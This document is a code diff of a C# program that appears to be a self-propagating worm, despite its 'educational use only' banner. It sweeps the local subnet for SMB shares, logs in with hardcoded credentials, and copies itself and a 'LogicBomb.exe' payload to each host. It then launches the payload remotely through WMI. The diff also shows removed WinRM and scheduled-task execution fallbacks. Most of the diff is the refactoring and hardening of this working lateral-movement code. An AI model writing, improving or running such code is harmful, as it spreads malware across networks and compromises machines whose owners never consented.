@@ -5,133 +5,230 @@ using System.IO;
 using System.Linq;
 using System.Management;
 using System.Net.NetworkInformation;
-using System.Net.Security;
 using System.Runtime.InteropServices;
 using System.Threading;
 using System.Threading.Tasks;
 using AuthenticationLevel = System.Management.AuthenticationLevel;
+
 class Program
 {
+    // Configuration - Consider moving to config file for production lab use
     private const string SMB_USERNAME = "user";
     private const string SMB_PASSWORD = "user";
     private const string SMB_SHARE_NAME = "SharedFolder";
     private const string PAYLOAD_FOLDER_NAME = "payload";
     private const string EXECUTABLE_TO_RUN = "LogicBomb.exe";
 
+    // Operational parameters
+    private const int PING_TIMEOUT_MS = 300;
+    private const int MAX_CONCURRENT_SCANS = 50;
+    private const int SCAN_TIMEOUT_MINUTES = 5;
+
     static async Task Main()
     {
+        Console.WriteLine("===========================================");
+        Console.WriteLine("MALWARE PROPAGATION SIMULATION - EDUCATIONAL USE ONLY");
+        Console.WriteLine("===========================================");
+        Console.WriteLine();
+
         Console.WriteLine("Starting IP Range, SMB Scan, Self-Deployment, and Remote Execution Test...");
         Console.WriteLine("-----------------------------------");
 
         string localIP = GetLocalIPAddress();
         if (localIP == null)
         {
-            Console.WriteLine("[ERROR] Could not detect local IP address.");
+            LogError("Could not detect local IP address.");
+            WaitForExit();
             return;
         }
 
         string baseIP = string.Join(".", localIP.Split('.').Take(3));
-        Console.WriteLine($"Local IP Address detected: {localIP}");
-        Console.WriteLine($"Scanning network: {baseIP}.1 - {baseIP}.254 for active SMB servers...");
+        LogInfo($"Local IP Address detected: {localIP}");
+        LogInfo($"Scanning network: {baseIP}.1 - {baseIP}.254 for active SMB servers...");
 
-        List<string> smbHosts = await FindSmbServersAsync(baseIP);
+        List<string> smbHosts;
+        string tempFolder = null;
 
-        if (smbHosts.Count == 0)
+        try
         {
-            Console.WriteLine("[INFO] No SMB servers found. Exiting.");
-            return;
+            // Scan with timeout and progress reporting
+            using (var cts = new CancellationTokenSource(TimeSpan.FromMinutes(SCAN_TIMEOUT_MINUTES)))
+            {
+                var progress = new Progress<ScanProgress>(p =>
+                {
+                    Console.Write($"\r[SCAN] Progress: {p.Completed}/254 hosts checked, {p.ActiveSmb} SMB hosts found");
+                });
+
+                smbHosts = await FindSmbServersAsync(baseIP, progress, cts.Token);
+                Console.WriteLine(); // New line after progress
+            }
+
+            if (smbHosts.Count == 0)
+            {
+                LogInfo("No SMB servers found. Exiting.");
+                WaitForExit();
+                return;
+            }
+
+            LogInfo($"Found {smbHosts.Count} SMB host(s) with accessible shares.");
+
+            // Prepare deployment package
+            tempFolder = Path.Combine(Path.GetTempPath(), $"IpScannerDeployment_{Guid.NewGuid():N}");
+            LogInfo($"Preparing deployment package in temporary folder: {tempFolder}");
+            PrepareDeploymentPackage(tempFolder);
+
+            // Deploy to each discovered host
+            foreach (string ip in smbHosts)
+            {
+                await ProcessTargetHost(ip, tempFolder);
+            }
+
+            Console.WriteLine("-----------------------------------");
+            LogInfo("Scan, deployment, and remote execution complete.");
+        }
+        catch (OperationCanceledException)
+        {
+            LogWarning("Operation timed out or was cancelled.");
+        }
+        catch (Exception ex)
+        {
+            LogError($"Unexpected error: {ex.Message}");
+            LogError($"Stack trace: {ex.StackTrace}");
+        }
+        finally
+        {
+            // Cleanup - ensure temp folder is deleted
+            if (tempFolder != null && Directory.Exists(tempFolder))
+            {
+                try
+                {
+                    LogInfo($"Deleting temporary directory: {tempFolder}");
+                    Directory.Delete(tempFolder, true);
+                    LogInfo("Cleanup completed successfully.");
+                }
+                catch (Exception ex)
+                {
+                    LogError($"Failed to clean up temporary folder: {ex.Message}");
+                }
+            }
         }
 
-        Console.WriteLine($"[INFO] Found {smbHosts.Count} SMB host(s) with accessible shares.");
+        WaitForExit();
+    }
 
-        string tempFolder = Path.Combine(Path.GetTempPath(), $"IpScannerDeployment_{Guid.NewGuid():N}");
-        Console.WriteLine($"Preparing deployment package in temporary folder: {tempFolder}");
-        PrepareDeploymentPackage(tempFolder);
+    private static async Task ProcessTargetHost(string ip, string tempFolder)
+    {
+        string remoteShareUNC = $"\\\\{ip}\\{SMB_SHARE_NAME}";
+        LogInfo($"Attempting SMB login on {remoteShareUNC}...");
 
-        foreach (string ip in smbHosts)
+        int smbConnectResult = ConnectToRemoteShare(remoteShareUNC, SMB_USERNAME, SMB_PASSWORD);
+
+        if (smbConnectResult == 0)
         {
-            string remoteShareUNC = $"\\\\{ip}\\{SMB_SHARE_NAME}";
-            Console.WriteLine($"Attempting SMB login on {remoteShareUNC}...");
-
-            int smbConnectResult = ConnectToRemoteShare(remoteShareUNC, SMB_USERNAME, SMB_PASSWORD);
-            if (smbConnectResult == 0)
+            try
             {
-                Console.WriteLine($"[SMB SUCCESS] Connected to {ip}. Copying deployment files...");
+                LogSuccess($"Connected to {ip}. Copying deployment files...");
                 await CopyFolderAsync(tempFolder, remoteShareUNC);
-                Console.WriteLine($"[COPY OK] Files copied to {remoteShareUNC}");
+                LogSuccess($"Files copied to {remoteShareUNC}");
 
-                Console.WriteLine($"[REMOTE EXEC] Attempting to execute '{EXECUTABLE_TO_RUN}' on {ip}...");
+                LogInfo($"Attempting to execute '{EXECUTABLE_TO_RUN}' on {ip} using WMI...");
 
                 string remoteServerPathToExecutable = $"C:\\{SMB_SHARE_NAME}\\{PAYLOAD_FOLDER_NAME}\\{EXECUTABLE_TO_RUN}";
 
-                bool executionSuccess = ExecuteRemoteCommand(ip, SMB_USERNAME, SMB_PASSWORD, remoteServerPathToExecutable);
+                bool executionSuccess = ExecuteRemoteCommandWMI(ip, SMB_USERNAME, SMB_PASSWORD, remoteServerPathToExecutable);
 
                 if (executionSuccess)
                 {
-                    Console.WriteLine($"[REMOTE EXEC SUCCESS] '{EXECUTABLE_TO_RUN}' executed successfully on {ip}");
+                    LogSuccess($"'{EXECUTABLE_TO_RUN}' executed successfully on {ip}");
                 }
                 else
                 {
-                    Console.WriteLine($"[REMOTE EXEC FAILED] Could not execute '{EXECUTABLE_TO_RUN}' on {ip}. Ensure PowerShell Remoting is enabled and credentials are correct.");
+                    LogWarning($"Could not execute '{EXECUTABLE_TO_RUN}' on {ip} using WMI.");
                 }
-
+            }
+            catch (Exception ex)
+            {
+                LogError($"Error processing {ip}: {ex.Message}");
+            }
+            finally
+            {
                 DisconnectFromRemoteShare(remoteShareUNC);
             }
-            else
-            {
-                Console.WriteLine($"[SMB FAILED] {ip} - Error Code: {smbConnectResult}");
-            }
         }
-
-        Console.WriteLine("-----------------------------------");
-        Console.WriteLine("Scan, deployment, and remote execution complete.");
-        Console.WriteLine($"[CLEANUP] Deleting temporary directory: {tempFolder}");
-        Directory.Delete(tempFolder, true);
-
-        Console.WriteLine("Press any key to exit.");
-        Console.ReadKey();
+        else
+        {
+            LogWarning($"SMB connection to {ip} failed - Error Code: {smbConnectResult} ({GetWNetErrorDescription(smbConnectResult)})");
+        }
     }
 
-    private static async Task<List<string>> FindSmbServersAsync(string baseIP)
+    private static async Task<List<string>> FindSmbServersAsync(
+        string baseIP,
+        IProgress<ScanProgress> progress = null,
+        CancellationToken cancellationToken = default)
     {
         var activeHosts = new List<string>();
         var pingTasks = new List<Task>();
+        var semaphore = new SemaphoreSlim(MAX_CONCURRENT_SCANS);
+        int completed = 0;
+        int activeSmbCount = 0;
 
-        var semaphore = new SemaphoreSlim(50);
         for (int i = 1; i <= 254; i++)
         {
+            if (cancellationToken.IsCancellationRequested)
+                break;
+
             string ip = $"{baseIP}.{i}";
-            await semaphore.WaitAsync();
+            await semaphore.WaitAsync(cancellationToken);
 
             pingTasks.Add(Task.Run(async () =>
             {
                 try
                 {
-                    var ping = new Ping();
-                    var reply = await ping.SendPingAsync(ip, 300);
-                    if (reply.Status == IPStatus.Success)
+                    using (var ping = new Ping())
                     {
-                        string smbPath = $"\\\\{ip}\\{SMB_SHARE_NAME}";
-                        int result = ConnectToRemoteShare(smbPath, SMB_USERNAME, SMB_PASSWORD);
-                        if (result == 0)
+                        var reply = await ping.SendPingAsync(ip, PING_TIMEOUT_MS);
+
+                        if (reply.Status == IPStatus.Success)
                         {
-                            Console.WriteLine($"[ACTIVE SMB] {ip} - Share '{SMB_SHARE_NAME}' accessible");
-                            lock (activeHosts)
+                            string smbPath = $"\\\\{ip}\\{SMB_SHARE_NAME}";
+                            int result = ConnectToRemoteShare(smbPath, SMB_USERNAME, SMB_PASSWORD);
+
+                            if (result == 0)
                             {
-                                activeHosts.Add(ip);
+                                Console.WriteLine($"\n[ACTIVE SMB] {ip} - Share '{SMB_SHARE_NAME}' accessible");
+                                lock (activeHosts)
+                                {
+                                    activeHosts.Add(ip);
+                                    activeSmbCount++;
+                                }
+                                DisconnectFromRemoteShare(smbPath);
                             }
-                            DisconnectFromRemoteShare(smbPath);
-                        }
-                        else
-                        {
-                            Console.WriteLine($"[ACTIVE] {ip} - No SMB share or invalid credentials");
+                            else
+                            {
+                                Console.WriteLine($"\n[ACTIVE] {ip} - Responds to ping but no accessible SMB share");
+                            }
                         }
                     }
                 }
-                catch (PingException) { }
-                catch (Exception ex) { Console.WriteLine($"[ERROR] {ip} - {ex.Message}"); }
-                finally { semaphore.Release(); }
-            }));
+                catch (PingException)
+                {
+                    // Expected for non-responsive hosts - suppress
+                }
+                catch (Exception ex)
+                {
+                    LogError($"{ip} - {ex.Message}");
+                }
+                finally
+                {
+                    semaphore.Release();
+                    int currentCompleted = Interlocked.Increment(ref completed);
+                    progress?.Report(new ScanProgress
+                    {
+                        Completed = currentCompleted,
+                        ActiveSmb = activeSmbCount
+                    });
+                }
+            }, cancellationToken));
         }
 
         await Task.WhenAll(pingTasks);
@@ -140,109 +237,102 @@ class Program
 
     private static void PrepareDeploymentPackage(string tempFolder)
     {
-        Directory.CreateDirectory(tempFolder);
-
-        string exePath = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
-        File.Copy(exePath, Path.Combine(tempFolder, Path.GetFileName(exePath)), overwrite: true);
-
-        string payloadFolder = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, PAYLOAD_FOLDER_NAME);
-        if (Directory.Exists(payloadFolder))
+        try
         {
-            CopyFolderSync(payloadFolder, Path.Combine(tempFolder, PAYLOAD_FOLDER_NAME));
-        }
-        else
-        {
-            Console.WriteLine($"WARNING: '{PAYLOAD_FOLDER_NAME}' folder not found, skipping copy. Please ensure '{EXECUTABLE_TO_RUN}' is in a '{PAYLOAD_FOLDER_NAME}' folder next to this program.");
-        }
+            Directory.CreateDirectory(tempFolder);
 
-        Console.WriteLine("Deployment package prepared successfully.");
+            // Copy current executable
+            string exePath = Process.GetCurrentProcess().MainModule.FileName;
+            string exeName = Path.GetFileName(exePath);
+            string destExePath = Path.Combine(tempFolder, exeName);
+
+            File.Copy(exePath, destExePath, overwrite: true);
+            LogInfo($"Copied {exeName} to deployment package");
+
+            // Copy payload folder if it exists
+            string payloadFolder = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, PAYLOAD_FOLDER_NAME);
+
+            if (Directory.Exists(payloadFolder))
+            {
+                string destPayloadFolder = Path.Combine(tempFolder, PAYLOAD_FOLDER_NAME);
+                CopyFolderSync(payloadFolder, destPayloadFolder);
+                LogInfo($"Copied '{PAYLOAD_FOLDER_NAME}' folder to deployment package");
+            }
+            else
+            {
+                LogWarning($"'{PAYLOAD_FOLDER_NAME}' folder not found at {payloadFolder}");
+                LogWarning($"Please ensure '{EXECUTABLE_TO_RUN}' is in a '{PAYLOAD_FOLDER_NAME}' folder next to this program.");
+            }
+
+            LogSuccess("Deployment package prepared successfully.");
+        }
+        catch (Exception ex)
+        {
+            LogError($"Failed to prepare deployment package: {ex.Message}");
+            throw;
+        }
     }
 
     private static void CopyFolderSync(string source, string dest)
     {
         Directory.CreateDirectory(dest);
+
         foreach (string file in Directory.GetFiles(source))
-            File.Copy(file, Path.Combine(dest, Path.GetFileName(file)), true);
+        {
+            string fileName = Path.GetFileName(file);
+            File.Copy(file, Path.Combine(dest, fileName), true);
+        }
 
         foreach (string dir in Directory.GetDirectories(source))
-            CopyFolderSync(dir, Path.Combine(dest, Path.GetFileName(dir)));
+        {
+            string dirName = Path.GetFileName(dir);
+            CopyFolderSync(dir, Path.Combine(dest, dirName));
+        }
     }
 
     private static async Task CopyFolderAsync(string source, string dest)
     {
         Directory.CreateDirectory(dest);
-        foreach (string file in Directory.GetFiles(source))
-            await Task.Run(() => File.Copy(file, Path.Combine(dest, Path.GetFileName(file)), true));
+
+        var fileTasks = Directory.GetFiles(source)
+            .Select(file => Task.Run(() =>
+            {
+                string fileName = Path.GetFileName(file);
+                File.Copy(file, Path.Combine(dest, fileName), true);
+            }))
+            .ToList();
+
+        await Task.WhenAll(fileTasks);
 
         foreach (string dir in Directory.GetDirectories(source))
-            await CopyFolderAsync(dir, Path.Combine(dest, Path.GetFileName(dir)));
+        {
+            string dirName = Path.GetFileName(dir);
+            await CopyFolderAsync(dir, Path.Combine(dest, dirName));
+        }
     }
 
     private static string GetLocalIPAddress()
     {
-        var host = System.Net.Dns.GetHostEntry(System.Net.Dns.GetHostName());
-        return host.AddressList.FirstOrDefault(a => a.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)?.ToString();
-    }
-
-    private static bool ExecuteRemoteCommand(string remoteIp, string username, string password, string commandToExecute)
-    {
-        // Helper to run a local process and capture output
-        (int ExitCode, string StdOut, string StdErr) RunProcess(string fileName, string args, int timeoutMs = 20000)
-        {
-            using (var p = new Process())
-            {
-                p.StartInfo.FileName = fileName;
-                p.StartInfo.Arguments = args;
-                p.StartInfo.RedirectStandardOutput = true;
-                p.StartInfo.RedirectStandardError = true;
-                p.StartInfo.UseShellExecute = false;
-                p.StartInfo.CreateNoWindow = true;
-
-                try
-                {
-                    p.Start();
-                }
-                catch (Exception exStart)
-                {
-                    return (-1, "", $"Failed to start {fileName}: {exStart.Message}");
-                }
-
-                string outStr = p.StandardOutput.ReadToEnd();
-                string errStr = p.StandardError.ReadToEnd();
-                if (!p.WaitForExit(timeoutMs))
-                {
-                    try { p.Kill(); } catch { }
-                    return (-2, outStr, errStr + " (timeout)");
-                }
-                return (p.ExitCode, outStr, errStr);
-            }
-        }
-
-        Console.WriteLine($"[EXEC] Attempting remote execution on {remoteIp} using provided credentials...");
-
-        // --- Method A: PowerShell Invoke-Command (WinRM) ---
         try
         {
-            string psCommand = $"Invoke-Command -ComputerName {remoteIp} -Credential (New-Object System.Management.Automation.PSCredential('{username}', (ConvertTo-SecureString '{password}' -AsPlainText -Force))) -ScriptBlock {{ Start-Process -FilePath '{commandToExecute}' -WindowStyle Hidden }} -ErrorAction Stop";
-            string args = $"-NoProfile -NonInteractive -Command \"{psCommand}\"";
-            Console.WriteLine("[EXEC-A] Trying PowerShell Invoke-Command (WinRM)...");
-            var res = RunProcess("powershell.exe", args, 15000);
-            Console.WriteLine($"[EXEC-A] Exit {res.ExitCode}. Out: {res.StdOut}. Err: {res.StdErr}");
-            if (res.ExitCode == 0)
-            {
-                Console.WriteLine("[EXEC-A] Remote execution via WinRM reported success.");
-                return true;
-            }
+            var host = System.Net.Dns.GetHostEntry(System.Net.Dns.GetHostName());
+            return host.AddressList
+                .FirstOrDefault(a => a.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
+                ?.ToString();
         }
         catch (Exception ex)
         {
-            Console.WriteLine("[EXEC-A] Exception: " + ex.Message);
+            LogError($"Failed to get local IP address: {ex.Message}");
+            return null;
         }
+    }
 
-        // --- Method B: WMI (Win32_Process.Create) ---
+    private static bool ExecuteRemoteCommandWMI(string remoteIp, string username, string password, string commandToExecute)
+    {
+        LogInfo($"Attempting WMI execution (Win32_Process.Create) on {remoteIp}...");
+
         try
         {
-            Console.WriteLine("[EXEC-B] Trying WMI (Win32_Process.Create) via System.Management...");
             ConnectionOptions connOpts = new ConnectionOptions
             {
                 Username = username,
@@ -250,87 +340,92 @@ class Program
                 Impersonation = ImpersonationLevel.Impersonate,
                 Authentication = AuthenticationLevel.Default,
                 EnablePrivileges = true,
-                Authority = null
+                Authority = null,
+                Timeout = TimeSpan.FromSeconds(30)
             };
 
             string path = $"\\\\{remoteIp}\\root\\cimv2";
             var scope = new ManagementScope(path, connOpts);
-            scope.Connect(); // may throw
+
+            LogInfo($"Connecting to WMI namespace: {path}");
+            scope.Connect();
+            LogInfo("WMI connection established");
 
             using (var processClass = new ManagementClass(scope, new ManagementPath("Win32_Process"), new ObjectGetOptions()))
             {
                 var inParams = processClass.GetMethodParameters("Create");
-                // If commandToExecute has spaces, wrap it as needed
                 inParams["CommandLine"] = commandToExecute;
+
+                LogInfo($"Executing command: {commandToExecute}");
                 var outParams = processClass.InvokeMethod("Create", inParams, null);
+
                 if (outParams != null)
                 {
                     var returnCode = Convert.ToInt32(outParams["returnValue"]);
                     var newPid = outParams["processId"] != null ? outParams["processId"].ToString() : "(none)";
-                    Console.WriteLine($"[EXEC-B] WMI Create returned {returnCode}, pid={newPid}");
-                    if (returnCode == 0 || returnCode == 2) // 0 success; 2 sometimes "access denied" variants vary by environment
+
+                    string resultMessage = GetWmiReturnCodeDescription(returnCode);
+                    LogInfo($"WMI Create returned code {returnCode}: {resultMessage}, ProcessID: {newPid}");
+
+                    // Consider both 0 (success) and 2 (access denied but may execute) as successful attempts
+                    if (returnCode == 0)
+                    {
+                        LogSuccess($"Remote execution successful on {remoteIp}");
                         return true;
+                    }
+                    else if (returnCode == 2)
+                    {
+                        LogWarning($"WMI returned 'Access Denied' but process may have launched on {remoteIp}");
+                        return true; // For lab purposes, consider this a successful interaction
+                    }
+                    else
+                    {
+                        LogWarning($"WMI execution failed with code {returnCode}");
+                    }
                 }
-            }
-        }
-        catch (Exception exWmi)
-        {
-            Console.WriteLine("[EXEC-B] WMI failed: " + exWmi.Message);
-        }
-
-        // --- Method C: remote Scheduled Task (schtasks) fallback ---
-        try
-        {
-            Console.WriteLine("[EXEC-C] Trying remote scheduled task via schtasks...");
-            string taskName = "RemoteRun_" + Guid.NewGuid().ToString("N");
-            // Ensure command path is quoted
-            string quotedCmd = $"\"{commandToExecute}\"";
-            // Create the task (runs once at a dummy time but we'll force run immediately)
-            string createArgs = $"/C schtasks /Create /S {remoteIp} /U {username} /P {password} /SC ONCE /ST 00:00 /TN \"{taskName}\" /TR {quotedCmd} /RL HIGHEST /F";
-            var createRes = RunProcess("cmd.exe", createArgs, 20000);
-            Console.WriteLine($"[EXEC-C] create exit {createRes.ExitCode}. Out: {createRes.StdOut}. Err: {createRes.StdErr}");
-
-            if (createRes.ExitCode == 0 || createRes.StdOut?.ToLower().Contains("success") == true)
-            {
-                // Run the task
-                string runArgs = $"/C schtasks /Run /S {remoteIp} /U {username} /P {password} /TN \"{taskName}\"";
-                var runRes = RunProcess("cmd.exe", runArgs, 15000);
-                Console.WriteLine($"[EXEC-C] run exit {runRes.ExitCode}. Out: {runRes.StdOut}. Err: {runRes.StdErr}");
-                if (runRes.ExitCode == 0 || runRes.StdOut?.ToLower().Contains("successfully") == true)
+                else
                 {
-                    Console.WriteLine("[EXEC-C] Scheduled task launched successfully.");
-                    // Optionally delete the task
-                    string delArgs = $"/C schtasks /Delete /S {remoteIp} /U {username} /P {password} /TN \"{taskName}\" /F";
-                    var delRes = RunProcess("cmd.exe", delArgs, 10000);
-                    Console.WriteLine($"[EXEC-C] cleanup exit {delRes.ExitCode}.");
-                    return true;
+                    LogWarning("WMI InvokeMethod returned null");
                 }
             }
-            else
+        }
+        catch (ManagementException mex)
+        {
+            LogError($"WMI ManagementException on {remoteIp}: {mex.Message}");
+            if (mex.InnerException != null)
             {
-                Console.WriteLine("[EXEC-C] Could not create scheduled task on remote host.");
+                LogError($"Inner Exception: {mex.InnerException.Message}");
             }
         }
-        catch (Exception exSch)
+        catch (UnauthorizedAccessException uex)
         {
-            Console.WriteLine("[EXEC-C] Exception: " + exSch.Message);
+            LogError($"Unauthorized Access on {remoteIp}: {uex.Message}");
+            LogError("Check that credentials have appropriate WMI/DCOM permissions");
+        }
+        catch (System.Runtime.InteropServices.COMException comEx)
+        {
+            LogError($"COM Exception on {remoteIp}: {comEx.Message} (HRESULT: 0x{comEx.HResult:X})");
+        }
+        catch (Exception ex)
+        {
+            LogError($"Unexpected exception on {remoteIp}: {ex.GetType().Name} - {ex.Message}");
         }
 
-        Console.WriteLine("[EXEC] All remote execution attempts failed. See logs above for details.");
         return false;
     }
 
-    [DllImport("mpr.dll")]
+    // P/Invoke declarations for network share connections
+    [DllImport("mpr.dll", CharSet = CharSet.Unicode)]
     private static extern int WNetAddConnection2(ref NETRESOURCE netResource, string password, string username, int flags);
 
-    [DllImport("mpr.dll")]
+    [DllImport("mpr.dll", CharSet = CharSet.Unicode)]
     private static extern int WNetCancelConnection2(string name, int flags, bool force);
 
     private static int ConnectToRemoteShare(string remotePath, string username, string password)
     {
         var nr = new NETRESOURCE
         {
-            dwType = 1,
+            dwType = 1, // RESOURCETYPE_DISK
             lpRemoteName = remotePath
         };
         return WNetAddConnection2(ref nr, password, username, 0);
@@ -338,10 +433,17 @@ class Program
 
     private static void DisconnectFromRemoteShare(string remotePath)
     {
-        WNetCancelConnection2(remotePath, 0, true);
+        try
+        {
+            WNetCancelConnection2(remotePath, 0, true);
+        }
+        catch (Exception ex)
+        {
+            LogWarning($"Failed to disconnect from {remotePath}: {ex.Message}");
+        }
     }
 
-    [StructLayout(LayoutKind.Sequential)]
+    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
     private struct NETRESOURCE
     {
         public int dwScope;
@@ -352,5 +454,80 @@ class Program
         public string lpRemoteName;
         public string lpComment;
         public string lpProvider;
+    }
+
+    // Helper methods for logging and error descriptions
+    private static void LogInfo(string message)
+    {
+        Console.ForegroundColor = ConsoleColor.Cyan;
+        Console.Write("[INFO] ");
+        Console.ResetColor();
+        Console.WriteLine(message);
+    }
+
+    private static void LogSuccess(string message)
+    {
+        Console.ForegroundColor = ConsoleColor.Green;
+        Console.Write("[SUCCESS] ");
+        Console.ResetColor();
+        Console.WriteLine(message);
+    }
+
+    private static void LogWarning(string message)
+    {
+        Console.ForegroundColor = ConsoleColor.Yellow;
+        Console.Write("[WARNING] ");
+        Console.ResetColor();
+        Console.WriteLine(message);
+    }
+
+    private static void LogError(string message)
+    {
+        Console.ForegroundColor = ConsoleColor.Red;
+        Console.Write("[ERROR] ");
+        Console.ResetColor();
+        Console.WriteLine(message);
+    }
+
+    private static string GetWmiReturnCodeDescription(int returnCode)
+    {
+        switch (returnCode)
+        {
+            case 0: return "Successful completion";
+            case 2: return "Access denied";
+            case 3: return "Insufficient privilege";
+            case 8: return "Unknown failure";
+            case 9: return "Path not found";
+            case 21: return "Invalid parameter";
+            default: return $"Unknown error code: {returnCode}";
+        }
+    }
+
+    private static string GetWNetErrorDescription(int errorCode)
+    {
+        switch (errorCode)
+        {
+            case 0: return "Success";
+            case 5: return "Access is denied";
+            case 53: return "The network path was not found";
+            case 86: return "The specified network password is not correct";
+            case 1219: return "Multiple connections to a server not allowed";
+            case 1326: return "Logon failure: unknown user name or bad password";
+            default: return $"Error code {errorCode}";
+        }
+    }
+
+    private static void WaitForExit()
+    {
+        Console.WriteLine();
+        Console.WriteLine("Press any key to exit.");
+        Console.ReadKey();
+    }
+
+    // Progress reporting struct
+    private struct ScanProgress
+    {
+        public int Completed { get; set; }
+        public int ActiveSmb { get; set; }
     }
 }
